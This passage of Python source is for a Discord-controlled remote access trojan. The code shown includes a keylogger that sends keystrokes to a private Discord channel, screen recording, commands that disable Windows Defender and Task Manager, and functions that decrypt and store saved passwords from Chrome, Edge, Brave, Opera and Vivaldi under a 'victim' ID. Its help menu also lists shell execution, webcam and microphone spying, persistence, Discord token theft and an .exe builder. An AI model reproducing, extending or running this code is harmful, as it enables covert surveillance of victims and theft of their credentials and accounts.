                print(f"Keylog send error: {e}")
        await asyncio.sleep(5)

# --- Commands ---
@bot.command(name="startrecording")
@commands.has_permissions(administrator=True)
async def start_recording(ctx, duration: int = 60):
    """Starts screen recording (default: 60s)"""
    if screen_recording["is_recording"]:
        await ctx.send("⚠️ Recording already running!")
        return

    try:
        # Create private channel
        overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.author: discord.PermissionOverwrite(read_messages=True)
        }
        channel = await ctx.guild.create_text_channel("screen-recordings", overwrites=overwrites)

        # Start recording
        screen_recording.update({
            "is_recording": True,
            "channel": channel,
            "task": asyncio.create_task(record_and_send_video(duration))
        })
        
        await ctx.send(f"🎥 Recording started for {duration}s in {channel.mention}")
    except Exception as e:
        await ctx.send(f"❌ Failed: {str(e)}")

async def record_and_send_video(duration):
    """Handles recording process"""
    try:
        with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmpfile:
            filename = tmpfile.name

        # Record in background
        await bot.loop.run_in_executor(None, record_screen, filename, duration)

        # Send result
        if screen_recording["is_recording"] and os.path.exists(filename):
            with open(filename, "rb") as f:
                await screen_recording["channel"].send(
                    "📹 Screen recording", 
                    file=discord.File(f)
                )
    except Exception as e:
        print(f"Recording error: {e}")
    finally:
        screen_recording["is_recording"] = False
        if os.path.exists(filename):
            os.remove(filename)

@bot.command(name="stoprecording")
@commands.has_permissions(administrator=True)
async def stop_recording(ctx):
    """Force-stops recording"""
    if not screen_recording["is_recording"]:
        await ctx.send("⚠️ No active recording!")
        return

    screen_recording["is_recording"] = False
    if screen_recording["task"]:
        screen_recording["task"].cancel()
    
    await ctx.send("🛑 Recording stopped")

 # ---------------- Keylogger Functions -------------------

async def send_keylogs_periodically():
    """Send buffered keys every 5 seconds"""
    while keylogger_state["is_active"] and keylogger_state["channel"]:
        if keylogger_state["buffer"]:
            try:
                # Combine and clear buffer
                message = "".join(keylogger_state["buffer"])
                keylogger_state["buffer"] = []
                
                # Split long messages to avoid Discord's character limit
                while len(message) > 0:
                    chunk = message[:1900]
                    message = message[1900:]
                    await keylogger_state["channel"].send(f"```{chunk}```")
                    
            except Exception as e:
                print(f"Error sending keylogs: {e}")
        
        await asyncio.sleep(5)

def on_key_press(key):
    """Callback for key presses"""
    try:
        keylogger_state["buffer"].append(key.char)
    except AttributeError:
        # Handle special keys
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]"
        }
        keylogger_state["buffer"].append(special_keys.get(key, f"[{key.name.upper()}]"))

@bot.command(name="keylog")
@commands.has_permissions(administrator=True)  # More restrictive permission
async def start_keylogger(ctx):
    """Start keylogging (ADMIN ONLY)"""
    if keylogger_state["is_active"]:
        await ctx.send("Keylogger is already running")
        return

    # Create private channel
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
        ctx.guild.me: discord.PermissionOverwrite(read_messages=True),
        ctx.author: discord.PermissionOverwrite(read_messages=True)
    }
    
    try:
        channel = await ctx.guild.create_text_channel(
            "keylogger-logs",
            overwrites=overwrites,
            reason=f"Keylogger session started by {ctx.author}"
        )
    except discord.Forbidden:
        await ctx.send("I don't have permission to create channels")
        return

    # Start keylogger
    keylogger_state.update({
        "is_active": True,
        "channel": channel,
        "listener": keyboard.Listener(on_press=on_key_press),
        "task": asyncio.create_task(send_keylogs_periodically())
    })
    keylogger_state["listener"].start()

    await ctx.send(f"Keylogger started in {channel.mention}")
    await channel.send("**Keylogger started**\n"
                      f"User: {ctx.author.display_name}\n"
                      f"Time: {datetime.datetime.now().isoformat()}")

@bot.command(name="stopkl")
@commands.has_permissions(administrator=True)
async def stop_keylogger(ctx):
    """Stop keylogging (ADMIN ONLY)"""
    if not keylogger_state["is_active"]:
        await ctx.send("Keylogger isn't running")
        return

    # Stop components
    keylogger_state["is_active"] = False
    if keylogger_state["listener"]:
        keylogger_state["listener"].stop()
    
    if keylogger_state["task"]:
        keylogger_state["task"].cancel()
        try:
            await keylogger_state["task"]
        except asyncio.CancelledError:
            pass

    # Send final buffer
    if keylogger_state["buffer"]:
        message = "".join(keylogger_state["buffer"])
        await keylogger_state["channel"].send(f"```Final keys:\n{message}```")

    # Clean up
    channel = keylogger_state["channel"]
    keylogger_state.update({
        "channel": None,
        "listener": None,
        "task": None,
        "buffer": []
    })

    await ctx.send("Keylogger stopped")
    await channel.send("**Keylogger stopped**\n"
                      f"Time: {datetime.datetime.now().isoformat()}")
    

# --- Chrome Password Decryption ---
def get_chrome_passwords():
    passwords = []
    try:
        # Chrome login data path
        data_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                               'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        
        # Copy the file to avoid DB lock
        temp_db = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
        try:
            shutil.copy2(data_path, temp_db)
        except Exception as e:
            return [f"Chrome DB copy failed: {str(e)}"]

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_pass = row
                try:
                    if not win32crypt:
                        passwords.append("win32crypt not available for decryption")
                        continue
                        
                    # Decrypt the password
                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_pass[3:15], None, None, None, 0)
                    cipher = AES.new(decrypted_key[1], AES.MODE_GCM, encrypted_pass[15:31])
                    password = cipher.decrypt(encrypted_pass[31:-16]).decode()
                    passwords.append(f"URL: {url}\nUser: {username}\nPass: {password}\n")
                except Exception as e:
                    passwords.append(f"Decryption failed for {url}: {str(e)}")
                    
            conn.close()
        except Exception as e:
            passwords.append(f"Chrome DB query failed: {str(e)}")
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
    except Exception as e:
        passwords.append(f"Chrome error: {str(e)}")
    
    return passwords

@bot.command(name="startpanel")
async def start_admin_panel(ctx, port: int = 5000):
    """🎯 Start the web-based admin panel"""
    try:
        import admin_panel
        import threading

        # Start Flask server in background thread
        thread = threading.Thread(target=admin_panel.run_server, args=('0.0.0.0', port), daemon=True)
        thread.start()

        await ctx.send(f"✅ **Admin Panel Started!**\n"
                      f"🌐 Access at: http://localhost:{port}\n"
                      f"📊 Dashboard is now running in the background")
        log_command("startpanel", True)
    except Exception as e:
        await ctx.send(f"❌ Failed to start admin panel: {str(e)}")
        log_command("startpanel", False)

@bot.command(name="cmds")
async def show_commands(ctx):
    """📜 Shows all available bot commands"""
    command_list = {
        "System Commands": [
            "!systeminfo - Show system information",
            "!screenshot - Take a screenshot",
            "!shutdown - Shutdown the computer",
            "!restart - Restart the computer",
            "!listprocesses - List running processes",
            "!kill [PID] - Kill a process by ID",
            "!exec [command] - Execute a shell command",
            "!killdefender - Disables Windows AntiVirus",
            "!disabletaskmgr - Disables Task Manager",
            "!enabletaskmgr - Enables Task Manager",
            "!openurl [url] - Open a URL in the browser",
            "!playsound [url] - Play sound from URL (.wav only)"
        ],
        "File Operations": [
            "!download [path] - Download a file",
            "!upload - Upload attached files",
            "!clipread - Read clipboard",
            "!clipwrite [text] - Write to clipboard"
        ],
        "Monitoring": [
            "!startrecording [duration] - Start screen recording",
            "!stoprecording - Stop recording",
            "!keylog - Start keylogger",
            "!stopkl - Stop keylogger",
            "!webcam - Take webcam photo",
            "!connections - Show network connections",
            "!micrecord [duration] - Record microphone audio",
            "!startlive - Start live microphone streaming to VC",
            "!stoplive - Stop live microphone streaming",
            "!livestatus - Check live audio status"
            "!webcamstream - Live monitor their webcam"
        ],
        "Persistence": [
            "!persist - Make bot launch on startup",
            "!stopstartup - Remove startup persistence",
            "!selfdestruct - Delete bot and traces"
        ],
        "Credential Theft": [
            "!dumpcreds - Dump saved passwords",
            "!dumpdiscord - Steal Discord tokens",
            "!dumpgames - Steal game launcher data"
        ],
        "Database & Analytics": [
            "!analytics - Show victim analytics",
            "!dumpdb - Download database file",
            "!viewcreds [limit] - View stored credentials"
        ],
        "Builder": [
            "!build - Compiles the bot into a distributable .exe "
        ],
        "Admin Panel": [
            "!startpanel [port] - Start web admin dashboard"
        ],
        "Other": [
            "!message [text] - Show message box",
            "!userinfo - Show user info",
            "!cmds - Show this help menu",
            "!geolocate [ip] - Geolocate IP (auto-detects if no IP given)"
        ]
    }

    embed = discord.Embed(title="🛠️ Available Commands", color=0x00ff00)
    
    for category, commands in command_list.items():
        embed.add_field(
            name=f"**{category}**",
            value="\n".join(commands),
            inline=False
        )

    embed.set_footer(text=f"Bot Prefix: {bot.command_prefix}")
    await ctx.send(embed=embed)

@bot.command(name="killdefender")
async def disable_defender(ctx):
    """🛡️ Disable Windows Defender"""
    try:
        cmds = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'net stop WinDefend'
        ]
        for cmd in cmds:
            subprocess.call(cmd, shell=True)
        await ctx.send("Windows Defender disabled!")
    except Exception as e:
        await ctx.send(f"Failed to disable Defender: {e}")

@bot.command(name="disabletaskmgr")
async def disable_task_manager(ctx):
    """Disables the Task Manager via registry."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        await ctx.send("✅ Task Manager has been disabled.")
    except Exception as e:
        await ctx.send(f"❌ Failed to disable Task Manager: {e}")

@bot.command(name="enabletaskmgr")
async def enable_task_manager(ctx):
    """Re-enables the Task Manager."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        await ctx.send("✅ Task Manager has been enabled.")
    except Exception as e:
        await ctx.send(f"❌ Failed to enable Task Manager: {e}")

# ... (previous commands)

@bot.command(name="openurl")
async def open_url(ctx, *, url: str):
    """🌐 Opens a specified URL in the user's default web browser."""
    try:
        await ctx.send(f"Trying to open <{url}> in the browser... This should be fun!")
        # Basic check to ensure a full URL for robustness
        if not (url.startswith("http://") or url.startswith("https://")):
            url = "http://" + url 

        success = webbrowser.open_new_tab(url)
        if success:
            await ctx.send(f"✅ Success! They should be seeing: <{url}> right about now.")
        else:
            await ctx.send(f"❌ Hmm, couldn't quite get the browser to open <{url}>. Maybe it's a server environment or no default browser configured?")
    except Exception as e:
        await ctx.send(f"❌ An error popped up trying to open the URL: {str(e)}")

@bot.command(name="playsound")
async def play_sound_from_url(ctx, *, url: str):
    """🔊 Downloads and plays a sound from a given URL on the user's system (best with .wav files)."""
    # Using the existing pyaudio and wave for simplicity, which works best with .wav
    # For more robust formats, you'd usually involve ffmpeg, but that adds complexity.
    try:
        await ctx.send(f"Getting ready to blast some tunes from: <{url}>... Hope they like surprises!")
        
        # 1. Download the audio file to a temporary location
        response = requests.get(url, stream=True, timeout=15)
        response.raise_for_status() # Catch HTTP errors like 404
        
        with tempfile.NamedTemporaryFile(delete=False, suffix=".wav") as temp_audio_file:
            for chunk in response.iter_content(chunk_size=8192):
                temp_audio_file.write(chunk)
            temp_file_path = temp_audio_file.name

        # 2. Play the audio using PyAudio and Wave
        p = pyaudio.PyAudio()
        wf = wave.open(temp_file_path, 'rb')

        stream = p.open(format=p.get_format_from_width(wf.getsampwidth()),
                        channels=wf.getnchannels(),
                        rate=wf.getframerate(),
                        output=True)

        data = wf.readframes(1024)
        while data:
            stream.write(data)
            data = wf.readframes(1024)

        stream.stop_stream()
        stream.close()
        p.terminate()
        wf.close()

        await ctx.send(f"✅ Sound from <{url}> played successfully! Wonder what they thought of that? 😉")
        
    except requests.exceptions.RequestException as e:
        await ctx.send(f"❌ Couldn't download the sound from <{url}>. Check the URL or their internet connection: {str(e)}")
    except wave.Error as e:
        await ctx.send(f"❌ Ah, the sound file wasn't a WAV format! `playsound` works best with **.wav** for now. Try a .wav URL: {str(e)}")
    except Exception as e:
        await ctx.send(f"❌ An unexpected glitch while trying to play the sound: {str(e)}")
    finally:
        # Clean up the temporary file
        if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
            os.remove(temp_file_path)

def get_public_ip():
    """Gets the victim's public IP address"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        try:
            response = requests.get('https://icanhazip.com', timeout=5)
            return response.text.strip()
        except:
            return None

@bot.command(name="geolocate")
async def geolocate_ip(ctx, ip: str = None):
    """🌍 Geolocate an IP address or automatically detect victim's location"""
    try:
        # If no IP provided, get the victim's public IP
        if ip is None:
            await ctx.send("🔍 Detecting victim's location...")
            ip = get_public_ip()
            if not ip:
                return await ctx.send("❌ Failed to detect public IP address")

        # Free IP-API service (100 requests/minute limit)
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()

        if response.get('status') != 'success':
            return await ctx.send(f"❌ Geolocation failed: {response.get('message', 'Unknown error')}")

        # Get more detailed info from ipapi.co
        try:
            detailed = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10).json()
        except:
            detailed = {}

        embed = discord.Embed(
            title=f"📍 IP Geolocation: {ip}",
            color=0x3498db,
            description=f"**Country:** {response.get('country', 'N/A')} ({response.get('countryCode', 'N/A')})\n"
                       f"**Region:** {response.get('regionName', 'N/A')}\n"
                       f"**City:** {response.get('city', 'N/A')}\n"
                       f"**ZIP Code:** {response.get('zip', detailed.get('postal', 'N/A'))}\n"
                       f"**Timezone:** {response.get('timezone', 'N/A')}\n"
                       f"**ISP:** {response.get('isp', 'N/A')}\n"
                       f"**Org:** {response.get('org', 'N/A')}\n"
                       f"**AS:** {response.get('as', 'N/A')}\n"
                       f"**Mobile:** {response.get('mobile', 'N/A')}\n"
                       f"**Proxy/VPN:** {response.get('proxy', 'N/A')}"
        )

        # Add coordinates
        if 'lat' in response and 'lon' in response:
            embed.add_field(
                name="📌 Coordinates",
                value=f"Lat: {response['lat']}, Lon: {response['lon']}",
                inline=False
            )
            # Google Maps link
            maps_url = f"https://www.google.com/maps?q={response['lat']},{response['lon']}"
            embed.add_field(
                name="🗺️ Google Maps",
                value=f"[Click here to view on map]({maps_url})",
                inline=False
            )

        await ctx.send(embed=embed)

    except requests.exceptions.Timeout:
        await ctx.send("⌛ Geolocation service timed out")
    except Exception as e:
        await ctx.send(f"❌ Geolocation error: {str(e)}")

def get_master_key(browser_path):
    """Fetches the AES encryption key from the 'Local State' file."""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
        
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
        
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    # Remove DPAPI prefix
    encrypted_key = encrypted_key[5:]
    # Decrypt the key using Windows DPAPI
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(password, key):
    """Decrypts a Chrome password blob using the master key."""
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt"

def steal_browser_creds():
    """Iterates through known browser paths and extracts credentials."""
    # Paths for Chromium-based browsers on Windows
    browser_paths = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data')
    }

    all_creds = ""
    victim_id = get_victim_id()
    timestamp = datetime.datetime.now().isoformat()

    # Connect to our database for storing
    try:
        db_conn = sqlite3.connect(DB_PATH)
        db_cursor = db_conn.cursor()
    except:
        db_conn = None

    for browser, path in browser_paths.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(path)
        if not master_key:
            continue

        all_creds += f"\n\n--- [ {browser} Credentials ] ---\n"

        # Chromium stores profiles in "Default", "Profile 1", "Profile 2", etc.
        profile_folders = [f.path for f in os.scandir(path) if f.is_dir() and (f.name == "Default" or f.name.startswith("Profile "))]

        for profile in profile_folders:
            login_db_path = os.path.join(profile, 'Login Data')
            if not os.path.exists(login_db_path):
                continue

            # Copy DB to avoid lock issues
            temp_db = tempfile.NamedTemporaryFile(delete=False).name
            shutil.copy2(login_db_path, temp_db)

            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for url, username, encrypted_pass in cursor.fetchall():
                    if url and username and encrypted_pass:
                        decrypted_pass = decrypt_password(encrypted_pass, master_key)
                        if decrypted_pass != "Failed to decrypt":
                            all_creds += f"URL: {url}\nUser: {username}\nPass: {decrypted_pass}\n\n"

                            # Store in database
                            if db_conn:
                                try:
                                    db_cursor.execute('''
                                        INSERT INTO credentials (timestamp, browser, url, username, password, victim_id)
                                        VALUES (?, ?, ?, ?, ?, ?)
                                    ''', (timestamp, browser, url, username, decrypted_pass, victim_id))
                                except:
                                    pass

                conn.close()
            except Exception as e:
                all_creds += f"Error reading {browser} DB: {e}\n"
            finally:
                os.remove(temp_db)

    # Commit database changes
    if db_conn:
        try:
            db_conn.commit()
            db_conn.close()
        except:
            pass

    return all_creds if all_creds else "No credentials found."

bot.run(TOKEN)
